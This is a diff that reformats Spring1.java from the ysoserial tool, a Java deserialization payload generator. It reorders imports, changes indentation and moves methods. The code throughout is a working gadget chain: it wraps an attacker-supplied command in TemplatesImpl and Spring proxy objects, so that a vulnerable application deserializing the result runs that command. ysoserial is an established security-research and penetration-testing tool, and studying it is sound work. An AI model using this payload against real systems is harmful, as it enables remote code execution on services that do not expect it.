@@ -1,15 +1,6 @@
 package ysoserial.payloads;
 
-import static java.lang.Class.forName;
-
-import java.lang.reflect.Constructor;
-import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.Type;
-
-import javax.xml.transform.Templates;
-
 import org.springframework.beans.factory.ObjectFactory;
-
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.annotation.PayloadTest;
@@ -17,6 +8,13 @@ import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.JavaVersion;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
+
+import javax.xml.transform.Templates;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Type;
+
+import static java.lang.Class.forName;
 
 /*
 	Gadget chain:
@@ -48,37 +46,37 @@ import ysoserial.payloads.util.Reflections;
  */
 
 @SuppressWarnings({"rawtypes"})
-@PayloadTest ( precondition = "isApplicableJavaVersion")
-@Dependencies({"org.springframework:spring-core:4.1.4.RELEASE","org.springframework:spring-beans:4.1.4.RELEASE"})
-@Authors({ Authors.FROHOFF })
+@PayloadTest(precondition = "isApplicableJavaVersion")
+@Dependencies({"org.springframework:spring-core:4.1.4.RELEASE", "org.springframework:spring-beans:4.1.4.RELEASE"})
+@Authors({Authors.FROHOFF})
 public class Spring1 extends PayloadRunner implements ObjectPayload<Object> {
 
-	public Object getObject(final String command) throws Exception {
-		final Object templates = Gadgets.createTemplatesImpl(command);
+    public static void main(final String[] args) throws Exception {
+        PayloadRunner.run(Spring1.class, args);
+    }
 
-		final ObjectFactory objectFactoryProxy =
-				Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", templates), ObjectFactory.class);
+    public static boolean isApplicableJavaVersion() {
+        return JavaVersion.isAnnInvHUniversalMethodImpl();
+    }
 
-		final Type typeTemplatesProxy = Gadgets.createProxy((InvocationHandler)
-				Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler")
-					.newInstance(objectFactoryProxy), Type.class, Templates.class);
+    public Object getObject(final String command) throws Exception {
+        final Object templates = Gadgets.createTemplatesImpl(command);
 
-		final Object typeProviderProxy = Gadgets.createMemoitizedProxy(
-				Gadgets.createMap("getType", typeTemplatesProxy),
-				forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));
+        final ObjectFactory objectFactoryProxy =
+            Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", templates), ObjectFactory.class);
 
-		final Constructor mitpCtor = Reflections.getFirstCtor("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
-		final Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[] {}), 0);
-		Reflections.setFieldValue(mitp, "methodName", "newTransformer");
+        final Type typeTemplatesProxy = Gadgets.createProxy((InvocationHandler)
+            Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler")
+                .newInstance(objectFactoryProxy), Type.class, Templates.class);
 
-		return mitp;
-	}
+        final Object typeProviderProxy = Gadgets.createMemoitizedProxy(
+            Gadgets.createMap("getType", typeTemplatesProxy),
+            forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));
 
-	public static void main(final String[] args) throws Exception {
-		PayloadRunner.run(Spring1.class, args);
-	}
+        final Constructor mitpCtor = Reflections.getFirstCtor("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
+        final Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[]{}), 0);
+        Reflections.setFieldValue(mitp, "methodName", "newTransformer");
 
-	public static boolean isApplicableJavaVersion() {
-	    return JavaVersion.isAnnInvHUniversalMethodImpl();
+        return mitp;
     }
 }
